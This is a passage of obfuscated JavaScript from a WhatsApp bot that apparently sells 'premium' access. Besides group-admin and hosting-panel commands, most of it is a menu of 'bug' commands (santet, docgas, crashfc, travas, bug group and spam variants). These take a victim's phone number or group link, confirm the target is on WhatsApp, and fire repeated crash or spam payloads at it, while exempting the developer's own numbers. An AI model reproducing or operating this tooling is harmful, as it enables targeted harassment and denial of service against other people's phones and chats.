            })[_0x1b775d(0x294)](() => _0x23b255[_0x1b775d(0x13d)](_0x42fa35, {
                'text': _0x1b775d(0x309) + mynum['split']('@')[0x0],
                'mentions': [mynum]
            }))[_0x1b775d(0x294)](() => _0x23b255[_0x1b775d(0x13d)](_0x5e0c1d, {
                'text': global[_0x1b775d(0x19c)]
            }, {
                'quoted': _0x38267e
            }));
        }
        break;
        case _0x1b775d(0x14d): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            let _0x548d39 = JSON[_0x1b775d(0x2dc)](fs[_0x1b775d(0x14c)](_0x1b775d(0x1b6)));
            if (_0x548d39[_0x1b775d(0x111)] == 0x0) return _0x25b16a(_0x1b775d(0x143));
            var _0x4ae258 = _0x1b775d(0x28c) + _0x548d39[_0x1b775d(0x111)] + '\x0a\x0a',
                _0x1c31ec = 0x1;
            for (let _0x6d0088 of _0x548d39) {
                _0x4ae258 += _0x1b775d(0x192) + _0x1c31ec++ + _0x1b775d(0x274) + _0x6d0088 + '\x0a\x0a';
            }
            _0x23b255['sendTextWithMentions'](_0x42fa35, _0x4ae258, _0x38267e);
        }
        break;
        case _0x1b775d(0x137): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!_0x3bedf8[0x0]) return _0x25b16a('Use ' + (_0x185059 + _0x2818bf) + _0x1b775d(0x290) + (_0x185059 + _0x2818bf) + ' 628xxxxx');
            bnnd = q['replace'](/[^0-9]/g, '');
            let _0x2184b5 = await _0x23b255[_0x1b775d(0x2a8)](bnnd + _0x1b775d(0x2f1));
            if (_0x2184b5['length'] == 0x0) return _0x25b16a(_0x1b775d(0x28e));
            if (premium[_0x1b775d(0x23b)](bnnd)) return _0x25b16a('_Nomor Tersebut Sudah Premium !!_');
            premium['push'](bnnd), fs[_0x1b775d(0x208)](_0x1b775d(0x1b6), JSON['stringify'](premium));
            let _0x4001d6 = bnnd + _0x1b775d(0x2f1);
            _0x106d54(_0x1b775d(0x24c) + _0x4001d6[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x20e), [_0x4001d6]), await sleep(0x9c4), _0x23b255[_0x1b775d(0x13d)](_0x4001d6, {
                'text': '*Congratulations users, you can now use premium features*'
            });
        }
        break;
        case 'delprem': {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!_0x3bedf8[0x0]) return _0x25b16a(_0x1b775d(0x25f) + (_0x185059 + _0x2818bf) + ' number\x0aExample ' + (_0x185059 + _0x2818bf) + _0x1b775d(0x29d));
            ya = q[_0x1b775d(0x11b)](/[^0-9]/g, ''), unp = premium[_0x1b775d(0x31f)](ya);
            if (!premium[_0x1b775d(0x23b)](ya)) return _0x25b16a('_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_');
            premium[_0x1b775d(0x1d1)](unp, 0x1), fs[_0x1b775d(0x208)]('./db/premium.json', JSON[_0x1b775d(0x1a9)](premium));
            let _0x48b9e5 = ya + _0x1b775d(0x2f1);
            _0x106d54(_0x1b775d(0x13f) + _0x48b9e5[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x30f), [_0x48b9e5]), await sleep(0x9c4), _0x23b255['sendMessage'](_0x48b9e5, {
                'text': '*Well, it\'s a shame, you can no longer access premium features because they were deleted*'
            });
        }
        break;
        case 'listown': {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            let _0x751e3a = JSON[_0x1b775d(0x2dc)](fs[_0x1b775d(0x14c)]('./db/owners.json'));
            if (_0x751e3a[_0x1b775d(0x111)] == 0x0) return _0x25b16a(_0x1b775d(0x143));
            var _0x4ae258 = _0x1b775d(0x28c) + _0x751e3a['length'] + '\x0a\x0a',
                _0x1c31ec = 0x1;
            for (let _0x2d3426 of _0x751e3a) {
                _0x4ae258 += _0x1b775d(0x192) + _0x1c31ec++ + _0x1b775d(0x274) + _0x2d3426 + '\x0a\x0a';
            }
            _0x23b255[_0x1b775d(0x12f)](_0x42fa35, _0x4ae258, _0x38267e);
        }
        break;
        case _0x1b775d(0x19a): {
            if (!_0x585723 && !_0x3424fb) return;
            if (!_0x3bedf8[0x0]) return _0x25b16a('Use ' + (_0x185059 + _0x2818bf) + _0x1b775d(0x290) + (_0x185059 + _0x2818bf) + _0x1b775d(0x29d));
            bnnd = q['replace'](/[^0-9]/g, '');
            let _0x452fde = await _0x23b255[_0x1b775d(0x2a8)](bnnd + _0x1b775d(0x2f1));
            if (_0x452fde[_0x1b775d(0x111)] == 0x0) return _0x25b16a('_Enter A Valid And Registered Number On WhatsApp!!_');
            if (ownerss[_0x1b775d(0x23b)](bnnd)) return _0x25b16a(_0x1b775d(0x251));
            ownerss[_0x1b775d(0x280)](bnnd), fs[_0x1b775d(0x208)](_0x1b775d(0x16b), JSON[_0x1b775d(0x1a9)](ownerss));
            let _0x51cf42 = bnnd + _0x1b775d(0x2f1);
            _0x106d54(_0x1b775d(0x24c) + _0x51cf42['split']('@')[0x0] + ' To the Owners Users Database*', [_0x51cf42]), await sleep(0x9c4), _0x23b255['sendMessage'](_0x51cf42, {
                'text': _0x1b775d(0x288)
            });
        }
        break;
        case 'delown': {
            if (!_0x585723 && !_0x3424fb) return;
            if (!_0x3bedf8[0x0]) return _0x25b16a(_0x1b775d(0x25f) + (_0x185059 + _0x2818bf) + _0x1b775d(0x290) + (_0x185059 + _0x2818bf) + _0x1b775d(0x29d));
            ya = q['replace'](/[^0-9]/g, ''), unp = ownerss[_0x1b775d(0x31f)](ya);
            if (!ownerss[_0x1b775d(0x23b)](ya)) return _0x25b16a(_0x1b775d(0x27f));
            ownerss[_0x1b775d(0x1d1)](unp, 0x1), fs[_0x1b775d(0x208)](_0x1b775d(0x16b), JSON[_0x1b775d(0x1a9)](ownerss));
            let _0x25be63 = ya + _0x1b775d(0x2f1);
            _0x106d54('*Deleting Success @' + _0x25be63[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x1fa), [_0x25be63]), await sleep(0x9c4), _0x23b255[_0x1b775d(0x13d)](_0x25be63, {
                'text': '*Well, it\'s a shame, you can no longer access owners features because they were deleted*'
            });
        }
        break;
        case '🥀':
        case '🍁':
        case '🐉':
        case '🌷':
        case '🍒':
        case _0x1b775d(0x11e): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            galakujiku = q[_0x1b775d(0x11b)](/[^0-9]/g, '');
            if (!galakujiku) return _0x25b16a(_0x1b775d(0x10d) + (_0x185059 + _0x2818bf) + ' 628xxxx');
            if (galakujiku == global[_0x1b775d(0x1da)][_0x1b775d(0x23b)]) return;
            if (galakujiku == _0x1b775d(0x1e5)) return;
            if (galakujiku == _0x1b775d(0x2ed)) return;
            let _0x1bd153 = await _0x23b255[_0x1b775d(0x2a8)](galakujiku + _0x1b775d(0x2f1));
            if (_0x1bd153[_0x1b775d(0x111)] == 0x0) return _0x25b16a(_0x1b775d(0x299));
            ha_wkwk = galakujiku + _0x1b775d(0x2f1), _0x25b16a(_0x1b775d(0x1cc)), await sleep(0x7d0), _0x49d796('*Succesfully Send ' + _0x2818bf + ' To @' + ha_wkwk[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x29b), [ha_wkwk]), await sleep(0x3e8), _0x10bc24(ha_wkwk, 0x8);
        }
        break;
        case '🍅':
        case '🌹':
        case '🐲':
        case '🔥':
        case '🦖':
        case '🦕': {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!q) return _0x25b16a('*Example :*\x0a' + _0x2818bf + ' 3');
            if (isNaN(parseInt(q))) return _0x25b16a(_0x1b775d(0x28f));
            if (_0x42fa35 == global['devNumber']['includes'] + _0x1b775d(0x2f1)) return;
            if (_0x42fa35 == _0x1b775d(0x287)) return;
            if (_0x42fa35 == '6283854543070@s.whatsapp.net') return;
            inijumlaaaa = encodeURI(q) * 0x5, _0x4159f4('⏳'), await sleep(0x7d0), _0x4159f4('✅'), await sleep(0x3e8), _0x10bc24(_0x42fa35, inijumlaaaa);
        }
        break;
        case _0x1b775d(0x235):
        case _0x1b775d(0x14a):
        case 'travass':
        case _0x1b775d(0x182):
        case _0x1b775d(0x23e):
        case _0x1b775d(0x110):
        case _0x1b775d(0x225):
        case _0x1b775d(0x2fc):
        case 'craship': {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            galakujiku = q['replace'](/[^0-9]/g, '');
            if (!galakujiku) return _0x25b16a(_0x1b775d(0x10d) + (_0x185059 + _0x2818bf) + _0x1b775d(0x256));
            if (galakujiku == global['devNumber'][_0x1b775d(0x23b)]) return;
            if (galakujiku == '6283834558105') return;
            if (galakujiku == '6283854543070') return;
            let _0x2b591b = await _0x23b255[_0x1b775d(0x2a8)](galakujiku + _0x1b775d(0x2f1));
            if (_0x2b591b[_0x1b775d(0x111)] == 0x0) return _0x25b16a('*The number is not registered in the WhatsApp application.*');
            ha_wkwk = galakujiku + _0x1b775d(0x2f1), _0x25b16a(_0x1b775d(0x1cc)), await sleep(0x7d0), _0x49d796(_0x1b775d(0x27e) + _0x2818bf + _0x1b775d(0x306) + ha_wkwk[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x26c), [ha_wkwk]), await sleep(0x3e8), _0x10868e(ha_wkwk, 0xf);
        }
        break;
        case _0x1b775d(0x1dd):
        case _0x1b775d(0x2d4):
        case _0x1b775d(0x325):
        case 'docgas':
        case _0x1b775d(0x10b):
        case _0x1b775d(0x114):
        case _0x1b775d(0x31e):
        case _0x1b775d(0x234):
        case 'santet': {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            galakujiku = q['replace'](/[^0-9]/g, '');
            if (!galakujiku) return _0x25b16a(_0x1b775d(0x10d) + (_0x185059 + _0x2818bf) + ' 628xxxx');
            if (galakujiku == global['devNumber'][_0x1b775d(0x23b)]) return;
            if (galakujiku == _0x1b775d(0x1e5)) return;
            if (galakujiku == '6283854543070') return;
            let _0x4c5ccb = await _0x23b255[_0x1b775d(0x2a8)](galakujiku + '@s.whatsapp.net');
            if (_0x4c5ccb[_0x1b775d(0x111)] == 0x0) return _0x25b16a('*The number is not registered in the WhatsApp application.*');
            ha_wkwk = galakujiku + _0x1b775d(0x2f1), _0x25b16a('*Bugs Are Being Processed...*'), await sleep(0x7d0), _0x49d796(_0x1b775d(0x27e) + _0x2818bf + _0x1b775d(0x306) + ha_wkwk[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x21b), [ha_wkwk]), await sleep(0x3e8), _0x10bc24(ha_wkwk, 0xa);
        }
        break;
        case _0x1b775d(0x28a):
        case _0x1b775d(0x2b4):
        case 'xlecgc':
        case _0x1b775d(0x242):
        case _0x1b775d(0x209):
        case _0x1b775d(0x293):
        case _0x1b775d(0x1a4): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!q) return _0x25b16a('*CARA MENGIRIM BUG GROUB*\x0a\x0a' + (_0x185059 + _0x2818bf) + _0x1b775d(0x1f3) + _0x2818bf + _0x1b775d(0x23f) + _0x2818bf + _0x1b775d(0x263));
            _0x4159f4('⏳');
            if (!q[_0x1b775d(0x149)](' ')[0x0][_0x1b775d(0x23b)](_0x1b775d(0x10f))) return _0x25b16a(_0x1b775d(0x1a0));
            resjoin = q[_0x1b775d(0x149)](' ')[0x0][_0x1b775d(0x149)](_0x1b775d(0x115))[0x1], inijumlah = q[_0x1b775d(0x149)](' ')[0x1] ? q[_0x1b775d(0x149)](' ')[0x1] : '1', initarget = await _0x23b255[_0x1b775d(0x249)](resjoin), await sleep(0x9c4), _0x4159f4('✅'), await sleep(0x3e8), _0x6a2258(initarget, inijumlah);
        }
        break;
        case _0x1b775d(0x108):
        case _0x1b775d(0x186):
        case _0x1b775d(0x25d):
        case _0x1b775d(0x11a):
        case _0x1b775d(0x254):
        case _0x1b775d(0x30e): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            if (!q) return _0x25b16a('*Format :*\x0a' + (_0x185059 + _0x2818bf) + _0x1b775d(0x2fd));
            target_orang = q[_0x1b775d(0x149)](',')[0x0], jumla_spamm = q[_0x1b775d(0x149)](',')[0x1] ? q[_0x1b775d(0x149)](',')[0x1] : '2';
            if (isNaN(parseInt(jumla_spamm))) return _0x25b16a('Jumlah wajib angka!!');
            meluatke = target_orang[_0x1b775d(0x11b)](/[^0-9]/g, '');
            let _0x5049fc = await _0x23b255[_0x1b775d(0x2a8)](meluatke + _0x1b775d(0x2f1));
            if (_0x5049fc[_0x1b775d(0x111)] == 0x0) return _0x25b16a('*The number is not registered in the WhatsApp application.*');
            if (meluatke == global[_0x1b775d(0x1da)]['includes']) return;
            if (meluatke == _0x1b775d(0x1e5)) return;
            if (meluatke == '6283854543070') return;
            let _0x1c1e11 = meluatke + _0x1b775d(0x2f1);
            jumlah = encodeURI(jumla_spamm) * 0xa, _0x25b16a('*Bugs Are Being Processed...*'), await sleep(0x7d0), _0x49d796(_0x1b775d(0x224) + _0x1c1e11[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x2fb) + jumlah + '*', [_0x1c1e11]), await sleep(0x3e8), _0x10bc24(_0x1c1e11, jumlah);
        }
        break;
        case _0x1b775d(0x2c0):
        case _0x1b775d(0x312):
        case _0x1b775d(0x179):
        case _0x1b775d(0x1e6):
        case _0x1b775d(0x2c4):
        case _0x1b775d(0x1d3): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            if (!q) return _0x25b16a(_0x1b775d(0x10d) + (_0x185059 + _0x2818bf) + _0x1b775d(0x2fd));
            target_orang = q[_0x1b775d(0x149)](',')[0x0], jumla_spamm = q[_0x1b775d(0x149)](',')[0x1] ? q[_0x1b775d(0x149)](',')[0x1] : '2';
            if (isNaN(parseInt(jumla_spamm))) return _0x25b16a(_0x1b775d(0x172));
            meluatke = target_orang[_0x1b775d(0x11b)](/[^0-9]/g, '');
            let _0x1b50ab = await _0x23b255[_0x1b775d(0x2a8)](meluatke + _0x1b775d(0x2f1));
            if (_0x1b50ab[_0x1b775d(0x111)] == 0x0) return _0x25b16a('*The number is not registered in the WhatsApp application.*');
            if (meluatke == global[_0x1b775d(0x1da)][_0x1b775d(0x23b)]) return;
            if (meluatke == _0x1b775d(0x1e5)) return;
            if (meluatke == _0x1b775d(0x2ed)) return;
            let _0x30fe97 = meluatke + _0x1b775d(0x2f1);
            jumlah = encodeURI(jumla_spamm) * 0x19, _0x25b16a('*Bugs Are Being Processed...*'), await sleep(0x7d0), _0x49d796(_0x1b775d(0x109) + _0x30fe97['split']('@')[0x0] + ', With The Amount Of Spam ' + jumlah + '*', [_0x30fe97]), await sleep(0x3e8), _0x10868e(_0x30fe97, jumlah);
        }
        break;
        case _0x1b775d(0x1c2):
            if (!_0x585723) return _0x25b16a('*Khusus Owner Leccy!*');
            blockw = q[_0x1b775d(0x149)]('|')[0x0][_0x1b775d(0x11b)](/[^0-9]/g, '');
            let _0x2869a1 = await _0x23b255[_0x1b775d(0x2a8)](blockw + _0x1b775d(0x2f1));
            if (_0x2869a1['length'] == 0x0) return _0x25b16a(_0x1b775d(0x28e));
            let _0x1aa73b = blockw + _0x1b775d(0x2f1);
            await _0x23b255[_0x1b775d(0x20d)](_0x1aa73b, _0x1b775d(0x1c2))['then'](_0x3ac2da => _0x25b16a(_0x4ea672(_0x3ac2da)))['catch'](_0x17fa56 => _0x25b16a(_0x4ea672(_0x17fa56)));
            break;
        case _0x1b775d(0x20a):
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x260));
            blockww = q['split']('|')[0x0]['replace'](/[^0-9]/g, '');
            let _0x3d0d11 = await _0x23b255[_0x1b775d(0x2a8)](blockww + _0x1b775d(0x2f1));
            if (_0x3d0d11[_0x1b775d(0x111)] == 0x0) return _0x25b16a(_0x1b775d(0x28e));
            let _0x1719d8 = blockww + _0x1b775d(0x2f1);
            await _0x23b255[_0x1b775d(0x20d)](_0x1719d8, 'unblock')[_0x1b775d(0x294)](_0x2ecb83 => _0x25b16a(_0x4ea672(_0x2ecb83)))[_0x1b775d(0x16a)](_0x2ffd49 => _0x25b16a(_0x4ea672(_0x2ffd49)));
            break;
        case _0x1b775d(0x1ac):
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x260));
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            _0x25b16a(_0x1b775d(0x2cf)), await _0x23b255['groupLeave'](_0x42fa35);
            break;
        case 'restart':
        case 'shutdown':
            if (!_0x585723) return _0x25b16a('*Khusus Owner Leccy!*');
            _0x25b16a(_0x1b775d(0x218)), await sleep(0xbb8), process[_0x1b775d(0x31c)]();
            break;
        case _0x1b775d(0x311): {
            mark = _0x1b775d(0x206), listmenuBot = _0x1b775d(0x2af) + global[_0x1b775d(0x141)] + _0x1b775d(0x28d) + global[_0x1b775d(0x21a)] + '*\x0aPengguna : *' + (_0x1eaf88 ? _0x1b775d(0x1ff) : _0x1b775d(0x106)) + _0x1b775d(0x2b7) + _0x5e0c1d[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x2f7) + mark[_0x1b775d(0x149)]('@')[0x0] + '*';
            if (global[_0x1b775d(0x2da)] == 'v1') _0x3c9814(listmenuBot, [_0x5e0c1d, mark]);
            else {
                if (global[_0x1b775d(0x2da)] == 'v2') _0x5110f5(listmenuBot, [_0x5e0c1d, mark]);
                else global[_0x1b775d(0x2da)] == 'v3' && _0x561604(listmenuBot, [_0x5e0c1d, mark]);
            }
        }
        break;
        case _0x1b775d(0x2bb):
        case _0x1b775d(0x203):
        case _0x1b775d(0x19d):
        case _0x1b775d(0x276):
        case _0x1b775d(0x2fe):
        case _0x1b775d(0x2c8):
        case _0x1b775d(0x315):
        case 'ownermenu':
        case _0x1b775d(0x1b0):
        case _0x1b775d(0x1bb):
        case _0x1b775d(0x2eb): {
            txt_bugandro = '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG ANDROID*\x0aタ #1hit 628XXXX\x0aタ #infinity 628XXXX\x0aタ #gaslec 628XXXX\x0aタ #xforce 628XXXX\x0aタ #santet 628XXXX\x0aタ #trolifc 628XXXX\x0aタ #travas 628XXXX\x0aタ #docgas 628XXXX\x0aタ #crashfc 628XXXX\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', txt_buginfinity = _0x1b775d(0x2ae), txt_bugemoji = _0x1b775d(0x1b3), txt_bugiphone = _0x1b775d(0x1b5), txt_buggroup = _0x1b775d(0x13c), txt_murbug = _0x1b775d(0x30a), txt_jadibot = _0x1b775d(0x304), txt_owner = _0x1b775d(0x27b), txt_group = _0x1b775d(0x241), txt_cpanel = _0x1b775d(0x278), txt_sound = _0x1b775d(0x119);
            if (_0x2818bf == _0x1b775d(0x203)) _0x5110f5(txt_bugandro, [_0x5e0c1d]);
            else {
                if (_0x2818bf == _0x1b775d(0x2bb)) _0x5110f5(txt_buginfinity, [_0x5e0c1d]);
                else {
                    if (_0x2818bf == 'bugemoji') _0x5110f5(txt_bugemoji, [_0x5e0c1d]);
                    else {
                        if (_0x2818bf == 'bugiphone') _0x5110f5(txt_bugiphone, [_0x5e0c1d]);
                        else {
                            if (_0x2818bf == _0x1b775d(0x276)) _0x5110f5(txt_buggroup, [_0x5e0c1d]);
                            else {
                                if (_0x2818bf == _0x1b775d(0x2c8)) _0x5110f5(txt_murbug, [_0x5e0c1d]);
                                else {
                                    if (_0x2818bf == _0x1b775d(0x315)) _0x5110f5(txt_jadibot, [_0x5e0c1d]);
                                    else {
                                        if (_0x2818bf == _0x1b775d(0x2d9)) _0x5110f5(txt_owner, [_0x5e0c1d]);
                                        else {
                                            if (_0x2818bf == _0x1b775d(0x1b0)) _0x5110f5(txt_group, [_0x5e0c1d]);
                                            else {
                                                if (_0x2818bf == 'cpanelmenu') _0x5110f5(txt_cpanel, [_0x5e0c1d]);
                                                else _0x2818bf == _0x1b775d(0x2eb) && _0x5110f5(txt_sound, [_0x5e0c1d]);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        break;
        case 'join':
            if (_0x38267e[_0x1b775d(0x2ad)]['fromMe']) return;
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x199));
            if (!q) return _0x25b16a(_0x1b775d(0x229));
            if (!_0x3bedf8[0x0][_0x1b775d(0x23b)](_0x1b775d(0x10f))) return _0x25b16a('Link Invalid!');
            resjoin = _0x3bedf8[0x0][_0x1b775d(0x149)]('https://chat.whatsapp.com/')[0x1];
            try {
                join = await _0x23b255[_0x1b775d(0x249)](resjoin), _0x25b16a(join);
            } catch (_0x43a345) {
                _0x25b16a(util[_0x1b775d(0x17a)](_0x43a345));
            }
            break;
        case 'linkgrup':
        case _0x1b775d(0x2ff): {
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            url_ = await _0x23b255['groupInviteCode'](_0x42fa35), yurl = _0x1b775d(0x115) + url_, _0x25b16a(yurl);
        }
        break;
        case _0x1b775d(0x129):
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            await _0x23b255[_0x1b775d(0x189)](_0x42fa35, _0x1b775d(0x131));
            const _0xb99539 = _0x1b775d(0x16c);
            _0x25b16a(_0xb99539);
            break;
        case _0x1b775d(0x148):
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            await _0x23b255[_0x1b775d(0x189)](_0x42fa35, 'announcement');
            const _0x1cc5fd = '*CLOSED* group closed by admin\x0anow only admin can send messages';
            _0x25b16a(_0x1cc5fd);
            break;
        case _0x1b775d(0x328): {
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            await _0x23b255['groupRevokeInvite'](_0x42fa35)['then'](_0x45f887 => _0x25b16a(_0x4ea672(_0x45f887)))[_0x1b775d(0x16a)](_0x19c120 => _0x25b16a(_0x4ea672(_0x19c120)));
        }
        break;
        case _0x1b775d(0x161):
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (_0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x24b)] === undefined || _0x38267e['message'][_0x1b775d(0x24b)] === null) return _0x25b16a(_0x1b775d(0x2f0));
            _0x25b16a('Sampah Grup Berhasil di Keluarkan!'), remove = _0x38267e['message'][_0x1b775d(0x24b)][_0x1b775d(0x1f2)]['participant'], await _0x23b255[_0x1b775d(0x20c)](_0x42fa35, [remove], _0x1b775d(0x24f));
            break;
        case _0x1b775d(0x132): {
            if (!_0x4ae346) return _0x25b16a('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!');
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            let _0x1151e4 = [];
            _0x28b967[_0x1b775d(0x21d)](_0x179140 => _0x1151e4[_0x1b775d(0x280)](_0x179140['id'])), _0x23b255[_0x1b775d(0x13d)](_0x42fa35, {
                'text': q ? q : '',
                'mentions': _0x1151e4
            });
        }
        break;
        case _0x1b775d(0x27a): {
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (_0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x24b)] === undefined || _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x24b)] === null) return _0x25b16a('Reply targetnya!');
            promote = _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x24b)][_0x1b775d(0x1f2)][_0x1b775d(0x2e5)], await _0x23b255[_0x1b775d(0x20c)](_0x42fa35, [promote], _0x1b775d(0x27a))['then'](_0x1913d4 => _0x25b16a(_0x4ea672(_0x1913d4)))['catch'](_0x8bd633 => _0x25b16a(_0x4ea672(_0x8bd633)));
        }
        break;
        case 'demote': {
            if (!_0x4ae346) return _0x25b16a('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!');
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (_0x38267e['message'][_0x1b775d(0x24b)] === undefined || _0x38267e['message'][_0x1b775d(0x24b)] === null) return _0x25b16a('Reply targetnya!');
            demote = _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x24b)]['contextInfo'][_0x1b775d(0x2e5)], await _0x23b255[_0x1b775d(0x20c)](_0x42fa35, [demote], 'demote')['then'](_0x44fbe7 => _0x25b16a(_0x4ea672(_0x44fbe7)))[_0x1b775d(0x16a)](_0x39a3d3 => _0x25b16a(_0x4ea672(_0x39a3d3)));
        }
        break;
        case _0x1b775d(0x31d):
        case _0x1b775d(0x136): {
            if (!_0x4ae346) return _0x25b16a('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!');
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (!q) return _0x25b16a('Nama Group Nya Mana?\x0a\x0aEx:\x0a.setname nama_group');
            await _0x23b255[_0x1b775d(0x2a6)](_0x42fa35, q)[_0x1b775d(0x294)](_0x26bee3 => _0x25b16a(_0x4ea672(_0x26bee3)))[_0x1b775d(0x16a)](_0x171963 => _0x25b16a(_0x4ea672(_0x171963)));
        }
        break;
        case 'setdesc':
        case 'setdesk': {
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!');
            if (!q) return _0x25b16a(_0x1b775d(0x302));
            await _0x23b255['groupUpdateDescription'](_0x42fa35, q)['then'](_0x1ebf7e => _0x25b16a(_0x4ea672(_0x1ebf7e)))[_0x1b775d(0x16a)](_0x263b80 => _0x25b16a(_0x4ea672(_0x263b80)));
        }
        break;
        case _0x1b775d(0x31b):
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a(_0x1b775d(0x1fb));
            if (_0x3bedf8[0x0] === _0x1b775d(0x129)) await _0x23b255[_0x1b775d(0x189)](_0x42fa35, 'unlocked')[_0x1b775d(0x294)](_0x399a6d => _0x25b16a('Successfully Opened Group Edit Info'))[_0x1b775d(0x16a)](_0x1e9bc2 => _0x25b16a(_0x4ea672(_0x1e9bc2)));
            else _0x3bedf8[0x0] === _0x1b775d(0x148) ? await _0x23b255[_0x1b775d(0x189)](_0x42fa35, _0x1b775d(0x283))[_0x1b775d(0x294)](_0x2c134d => _0x25b16a('Successfully Closed Group Edit Info'))[_0x1b775d(0x16a)](_0x29a79e => _0x25b16a(_0x4ea672(_0x29a79e))) : _0x25b16a(_0x1b775d(0x223) + (_0x185059 + _0x2818bf) + _0x1b775d(0x1d4));
            break;
        case _0x1b775d(0x167): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x85796b = await fetch(global[_0x1b775d(0x286)] + '/api/client/account/api-keys', {
                    'method': _0x1b775d(0x1ad),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1c4)]
                    }
                }),
                _0x1242c6 = await _0x85796b[_0x1b775d(0x2d2)]();
            if (_0x1242c6['errors']) return _0x25b16a(util['format'](_0x1242c6['errors'][0x0]));
            _0x25b16a(util[_0x1b775d(0x17a)](_0x1242c6[_0x1b775d(0x2e1)]));
        }
        break;
        case _0x1b775d(0x23a): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x1aa966 = q ? q : _0xa77d0c(0x5),
                _0x5477f5 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x2aa), {
                    'method': _0x1b775d(0x292),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1c4)]
                    },
                    'body': JSON[_0x1b775d(0x1a9)]({
                        'description': _0x1aa966,
                        'allowed_ips': []
                    })
                }),
                _0x14bf2d = await _0x5477f5[_0x1b775d(0x2d2)]();
            _0x25b16a(util['format'](_0x14bf2d));
            if (_0x14bf2d[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x14bf2d[_0x1b775d(0x164)][0x0]));
        }
        break;
        case _0x1b775d(0x1dc): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x2bebc2 = q[_0x1b775d(0x149)](',')[0x0] || _0x5e0c1d['split']('@')[0x0],
                _0x3e9c2e = q['split'](',')[0x1];
